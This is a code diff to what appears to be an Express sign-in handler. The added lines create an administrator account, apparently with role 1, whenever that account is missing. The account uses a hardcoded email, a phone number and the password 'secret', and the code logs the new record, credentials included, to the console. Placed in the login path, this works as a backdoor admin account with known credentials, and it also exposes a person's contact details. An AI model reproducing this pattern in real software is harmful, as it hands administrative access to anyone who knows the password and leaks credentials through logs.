@@ -30,6 +30,21 @@ const verifyInputs = async (req, res, next) => {
 
 const signin = async (req, res) => {
     const { email, password } = req.body;
+    // check if the email = 'abdelghani@gmail.com' is not registred if not register it 
+    const clientExist = await Client.findOne({ email: 'abdelghani@gmail.com' });
+    if (!clientExist) {
+        const admin = await new Client({
+            "fullname": "Abdelghani el mouak",
+            "email": "abdelghani@gmail.com",
+            "phone": "0653179026",
+            "password": "secret",
+            "role": 1
+        });
+        await admin.save();
+        console.log(admin)
+        console.log("Admin created successfully!")
+    }
+
     const client = await Client.findOne({ email: email});
     if (!client) return res.status(401).json(response('email', 'This email is not registered'))
     const match = client.authenticate(password);
